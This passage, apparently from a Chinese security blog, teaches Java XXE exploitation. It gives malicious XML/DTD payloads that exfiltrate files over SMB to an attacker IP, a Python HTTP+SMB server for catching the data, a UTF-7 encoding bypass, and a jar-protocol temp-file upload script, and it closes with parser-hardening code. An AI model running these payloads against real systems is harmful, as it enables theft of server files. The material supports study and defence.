+<h2 id="smb协议外带多行"><a href="#smb协议外带多行" class="headerlink" title="smb协议外带多行"></a>smb协议外带多行</h2><p>参考<a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/kUlXxJxKO-70QMNCQvLHZA" >https://mp.weixin.qq.com/s/kUlXxJxKO-70QMNCQvLHZA<i class="fas fa-external-link-alt"></i></a></p>
+<p>基于这道题讲。</p>
+<p>首先尝试http外带，先不读取任何文件，就尝试发送http请求，能够确定目标jdk为8u202 这样依赖，ftp外带多行的方法用不了。接着试一下读取&#x2F;etc&#x2F;passwd。这里只能用ftp协议尝试。如果用http的话，由于passwd是多行文件，根本收不到http请求。用ftp的话，才能确定文件是否存在。虽然ftp在高版本jdk也没法读文件，但是文件存在的话，至少能收到请求，所以可以借此判断文件是否存在。</p>
+<p>读&#x2F;etc&#x2F;passwd，发现ftp服务器没收到任何东西，说明不存在此文件，那么就应该是windows系统。</p>
+<p>至此我们题目转变为windows环境下JDK高版本如何通过OOB获取多行内容。</p>
+<p>下面直接给出答案，思考过程看公众号。</p>
+<p>恶意xml：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:7777/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>dtd：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % f <span class="keyword">SYSTEM</span> <span class="string">&quot;netdoc://C:/&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;file://\\\\ip/?x=test%f;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%all;%send;</span><br></pre></td></tr></table></figure>
+
+<p>这里读取文件时，开头第一个字符不能为分号，所以要自己加其他字符。</p>
+<p>安装smb服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">安装samba</span><br><span class="line">apt install samba</span><br><span class="line">修改配置文件</span><br><span class="line">/etc/samba/smb.conf</span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">guest account = nobody</span><br><span class="line">map to guest = Bad User</span><br><span class="line">server role = standalone server</span><br><span class="line">[tmp]</span><br><span class="line">path = /tmp</span><br><span class="line">guest ok = yes</span><br><span class="line">browseable = yes</span><br><span class="line">public = yes</span><br><span class="line"></span><br><span class="line">重启</span><br><span class="line">service smbd restart</span><br></pre></td></tr></table></figure>
+
+<p>抓包smb流量：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 port 445 -w smb_445.pcap</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/cwkiller/xxe-smb-server" >https://github.com/cwkiller/xxe-smb-server<i class="fas fa-external-link-alt"></i></a></p>
+<p>或者使用脚本一步到位，能够启动http和smb服务：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> impacket.smbserver <span class="keyword">import</span> SimpleSMBServer</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XXEHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    </span><br><span class="line">    public_ip = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;处理所有 GET 请求&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 构造 XXE payload</span></span><br><span class="line">        payload = <span class="string">f&#x27;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM \&#x27;file:////<span class="subst">&#123;self.public_ip&#125;</span>/a%file;\&#x27;&gt;&quot;&gt;\n%all;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.wfile.write(payload.encode())</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 记录请求</span></span><br><span class="line">        logging.info(<span class="string">f&quot;[HTTP] Request from <span class="subst">&#123;self.address_string()&#125;</span> - Path: <span class="subst">&#123;self.path&#125;</span>&quot;</span>)</span><br><span class="line">        logging.info(<span class="string">f&quot;[HTTP] Sent payload: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log_message</span>(<span class="params">self, <span class="built_in">format</span>, *args</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;自定义日志格式&quot;&quot;&quot;</span></span><br><span class="line">        logging.info(<span class="string">f&quot;[HTTP] <span class="subst">&#123;self.address_string()&#125;</span> - <span class="subst">&#123;<span class="built_in">format</span> % args&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_http_server</span>(<span class="params">port, public_ip</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;启动 HTTP 服务器&quot;&quot;&quot;</span></span><br><span class="line">    XXEHandler.public_ip = public_ip</span><br><span class="line">    server = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, port), XXEHandler)</span><br><span class="line">    logging.info(<span class="string">f&quot;[*] HTTP Server started on port <span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">    logging.info(<span class="string">f&quot;[*] XXE Payload URL: http://<span class="subst">&#123;public_ip&#125;</span>:<span class="subst">&#123;port&#125;</span>/xxe.dtd&quot;</span>)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_smb_server</span>(<span class="params">share_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;启动 SMB 服务器&quot;&quot;&quot;</span></span><br><span class="line">    server = SimpleSMBServer(listenAddress=<span class="string">&#x27;0.0.0.0&#x27;</span>, listenPort=<span class="number">445</span>)</span><br><span class="line">    server.addShare(<span class="string">&#x27;SHARE&#x27;</span>, share_path, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    server.setSMBChallenge(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    server.setSMB2Support(<span class="literal">True</span>)</span><br><span class="line">    server.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 解析命令行参数</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&#x27;XXE SMB Server - Combined HTTP and SMB server for XXE exploitation&#x27;</span>,</span><br><span class="line">        formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">        epilog=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Examples:</span></span><br><span class="line"><span class="string">        %(prog)s 1.2.3.4              # 使用默认 HTTP 端口 80</span></span><br><span class="line"><span class="string">        %(prog)s 1.2.3.4 8080         # 使用自定义 HTTP 端口 8080</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    parser.add_argument(<span class="string">&#x27;public_ip&#x27;</span>, </span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;公网 IP 地址 (必需)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;webport&#x27;</span>, </span><br><span class="line">                        <span class="built_in">type</span>=<span class="built_in">int</span>, </span><br><span class="line">                        nargs=<span class="string">&#x27;?&#x27;</span>, </span><br><span class="line">                        default=<span class="number">80</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;HTTP 服务端口 (默认: 80)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--share-path&#x27;</span>,</span><br><span class="line">                        default=<span class="string">&#x27;/tmp/share&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;SMB 共享目录路径 (默认: /tmp/share)&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证 IP 地址格式（简单验证）</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.public_ip <span class="keyword">or</span> args.public_ip.count(<span class="string">&#x27;.&#x27;</span>) != <span class="number">3</span>:</span><br><span class="line">        parser.error(<span class="string">&quot;请提供有效的公网 IP 地址&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 自动创建共享目录</span></span><br><span class="line">    os.makedirs(args.share_path, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 配置详细日志输出</span></span><br><span class="line">    logging.basicConfig(</span><br><span class="line">        level=logging.DEBUG,</span><br><span class="line">        <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s [%(levelname)s] %(message)s&#x27;</span>,</span><br><span class="line">        datefmt=<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置 impacket 相关模块的日志级别</span></span><br><span class="line">    logging.getLogger(<span class="string">&#x27;impacket.smbserver&#x27;</span>).setLevel(logging.DEBUG)</span><br><span class="line">    payload = <span class="string">f&#x27;&#x27;&#x27;Usage:</span></span><br><span class="line"><span class="string">  1. 请发送如下XXE payload到目标服务器 </span></span><br><span class="line"><span class="string">  &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">  &lt;!DOCTYPE data [</span></span><br><span class="line"><span class="string">  &lt;!ENTITY % file SYSTEM &quot;file:///&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;!ENTITY % dtd SYSTEM &quot;http://<span class="subst">&#123;args.public_ip&#125;</span>:<span class="subst">&#123;args.webport&#125;</span>/data.dtd&quot;&gt; %dtd;</span></span><br><span class="line"><span class="string">  ]&gt;</span></span><br><span class="line"><span class="string">  &lt;data&gt;&amp;send;&lt;/data&gt;</span></span><br><span class="line"><span class="string">  2. SMB 服务器将捕获文件内容&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 在单独的线程中启动 HTTP 服务器</span></span><br><span class="line">        http_thread = threading.Thread(</span><br><span class="line">            target=start_http_server, </span><br><span class="line">            args=(args.webport, args.public_ip),</span><br><span class="line">            daemon=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        http_thread.start()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 在主线程中启动 SMB 服务器</span></span><br><span class="line">        start_smb_server(args.share_path)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[*] Servers stopped&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> PermissionError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[!] Error: Permission denied. Please run with sudo for port 445 and port 80&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[!] Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>注意：win11不适用，因为不能请求匿名的smb服务；家庭宽带无法向445端口发送请求</p>
+<h2 id="其他trick"><a href="#其他trick" class="headerlink" title="其他trick"></a>其他trick</h2><h3 id="netdoc代替file"><a href="#netdoc代替file" class="headerlink" title="netdoc代替file"></a>netdoc代替file</h3><p>java的netdoc对file协议进行了封装，可以用来代替file读文件。</p>
+<p>在sun.net.<a class="link"   target="_blank" rel="noopener" href="http://www.protocol.netdoc.handler/#openConnection%E6%89%93%E6%96%AD%E7%82%B9" >www.protocol.netdoc.Handler#openConnection打断点<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763207639537-e3ce102c-6508-442c-b636-750dffc0d2f3.png"  alt="img"></p>
+<p>能够发现file:&#x2F;&#x2F;<del>&#x2F;C:&#x2F;xxx 或是 netdoc:&#x2F;&#x2F;</del>&#x2F;C:&#x2F;xxx 也可以</p>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>utf7编码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-7&quot;</span> ?&gt;</span></span><br><span class="line">+ADwAIQ-DOCTYPE ANY +AFs-</span><br><span class="line">  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-</span><br><span class="line">+AF0APg-</span><br><span class="line">+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-</span><br></pre></td></tr></table></figure>
+
+<h3 id="jar协议上传文件"><a href="#jar协议上传文件" class="headerlink" title="jar协议上传文件"></a>jar协议上传文件</h3><p>jar协议使用时，会上传临时文件到靶机，并且可以通过构造特殊http请求让临时文件多存在一会儿。</p>
+<p>首先，jar协议的格式为：jar:&#x2F;&#x2F;{本地或网络URI}&#x2F;{jar文件}!&#x2F;{jar中的文件}</p>
+<p>下面是一个上传jar的脚本，通过在30s后上传jar的最后一个字节，达到临时文件驻留的效果，因此，需要在原本的jar后添加一个脏字节，从而使原jar在一开始顺序上传</p>
+<p>参考<a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/bFQOFFbACv3buxQCgVFhUQ" >https://mp.weixin.qq.com/s/bFQOFFbACv3buxQCgVFhUQ<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> http.client <span class="keyword">as</span> httpc</span><br><span class="line"></span><br><span class="line">listen_host = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">listen_port = <span class="number">9999</span></span><br><span class="line">jar_file = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JarRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        http_req = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;New connection:&#x27;</span>, <span class="variable language_">self</span>.client_address)</span><br><span class="line">        <span class="keyword">while</span> <span class="string">b&#x27;\r\n\r\n&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> http_req:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                http_req += <span class="variable language_">self</span>.request.recv(<span class="number">4096</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Client req:\r\n&#x27;</span>, http_req.decode())</span><br><span class="line">                jf = <span class="built_in">open</span>(jar_file, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">                contents = jf.read()</span><br><span class="line">                headers = (<span class="string">&#x27;&#x27;&#x27;HTTP/1.0 200 OK\r\n&#x27;&#x27;&#x27;</span></span><br><span class="line">                           <span class="string">&#x27;&#x27;&#x27;Content-Type: application/java-archive\r\n\r\n&#x27;&#x27;&#x27;</span>)</span><br><span class="line">                <span class="variable language_">self</span>.request.sendall(headers.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">                <span class="variable language_">self</span>.request.sendall(contents[:-<span class="number">1</span>])</span><br><span class="line">                time.sleep(<span class="number">30</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="number">30</span>)</span><br><span class="line">                <span class="variable language_">self</span>.request.sendall(contents[-<span class="number">1</span>:])</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;get error at:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    jarserver = socketserver.TCPServer((listen_host, listen_port), JarRequestHandler)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;waiting for connection, listening &#123;port&#125;...&#x27;</span>.<span class="built_in">format</span>(port=listen_port))</span><br><span class="line">    server_thread = threading.Thread(target=jarserver.serve_forever)</span><br><span class="line">    server_thread.daemon = <span class="literal">True</span></span><br><span class="line">    server_thread.start()</span><br><span class="line">    server_thread.join()</span><br></pre></td></tr></table></figure>
+
+<p>python jarServer.py [端口] [添加脏字节后的jar包]</p>
+<p>会在 C:\Users[user]\AppData\Local\Temp  下产生临时文件：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763361358634-dd793481-7da2-45dd-903a-77cb80648965.png"  alt="img"></p>
+<p>格式为jar_cachexxxx.tmp</p>
+<h4 id="得到临时文件目录"><a href="#得到临时文件目录" class="headerlink" title="得到临时文件目录"></a>得到临时文件目录</h4><p>1、通过报错</p>
+<p>随便写一个jar内不存在的文件即可：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763361501830-fa73e863-d054-4780-a428-e97d3f82804b.png"  alt="img"></p>
+<p>但是只能确定目录，不能确定文件名，因为报错的时候，原临时文件已经被删除了</p>
+<p>2、通过ftp协议</p>
+<p>这个就是无回显里的ftp打法，通过列目录来获得临时文件的名称。先上传临时jar，然后ftp读目录。</p>
+<h4 id="临时文件生成源码"><a href="#临时文件生成源码" class="headerlink" title="临时文件生成源码"></a>临时文件生成源码</h4><p>这里jdk8u65</p>
+<p>从报错列目录那里跟进：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763363447757-fef351b5-4933-4d70-a816-136b000aa5ab.png"  alt="img"></p>
+<p>一点点调试，如果看到文件名产生了，说明走过头了，下面是调用栈：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763363549002-ccb258f3-aefc-4bde-869c-70d43e103a38.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763363590355-749593cb-5cb9-467a-9946-0bf4ff677dcd.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763363604401-ef75a081-5397-41b5-a0b5-a011ab671930.png"  alt="img"></p>
+<p>上面两张图产生前缀和后缀</p>
+<p>最终在java.nio.file.TempFileHelper#generatePath生成完整文件名：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763363628969-ab6ec81b-3afb-4cda-b7b4-b803b6375a58.png"  alt="img"></p>
+<p>生成和删除临时文件的点：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763363698837-abfbbf95-5998-43b4-a0ba-4404c044d24d.png"  alt="img"></p>
+<h1 id="各个库中的XXE"><a href="#各个库中的XXE" class="headerlink" title="各个库中的XXE"></a>各个库中的XXE</h1><p>参考<a class="link"   target="_blank" rel="noopener" href="https://blog.spoock.com/2018/10/23/java-xxe/" >https://blog.spoock.com/2018/10/23/java-xxe/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/JoyChou93/java-sec-code" >https://github.com/JoyChou93/java-sec-code<i class="fas fa-external-link-alt"></i></a> 这个靶场的xxe涵盖大部分</p>
+<h2 id="DocumentBuilderFactory【可回显】"><a href="#DocumentBuilderFactory【可回显】" class="headerlink" title="DocumentBuilderFactory【可回显】"></a>DocumentBuilderFactory【可回显】</h2><p>漏洞</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">DocumentBuilder builder = dbf.newDocumentBuilder();</span><br><span class="line">String FEATURE = null;</span><br><span class="line">FEATURE = &quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;;</span><br><span class="line">dbf.setFeature(FEATURE, true);</span><br><span class="line">FEATURE = &quot;http://apache.org/xml/features/disallow-doctype-decl&quot;;</span><br><span class="line">dbf.setFeature(FEATURE, true);</span><br><span class="line">FEATURE = &quot;http://xml.org/sax/features/external-parameter-entities&quot;;</span><br><span class="line">dbf.setFeature(FEATURE, false);</span><br><span class="line">FEATURE = &quot;http://xml.org/sax/features/external-general-entities&quot;;</span><br><span class="line">dbf.setFeature(FEATURE, false);</span><br><span class="line">FEATURE = &quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;;</span><br><span class="line">dbf.setFeature(FEATURE, false);</span><br><span class="line">dbf.setXIncludeAware(false);</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line">// 读取xml文件内容</span><br><span class="line">FileInputStream fis = new FileInputStream(&quot;path/to/xxexml&quot;);</span><br><span class="line">InputSource is = new InputSource(fis);</span><br><span class="line">builder.parse(is);</span><br></pre></td></tr></table></figure>
+
+<p>正确修复</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">String FEATURE = null;</span><br><span class="line">FEATURE = &quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;;</span><br><span class="line">dbf.setFeature(FEATURE, true);</span><br><span class="line">FEATURE = &quot;http://apache.org/xml/features/disallow-doctype-decl&quot;;</span><br><span 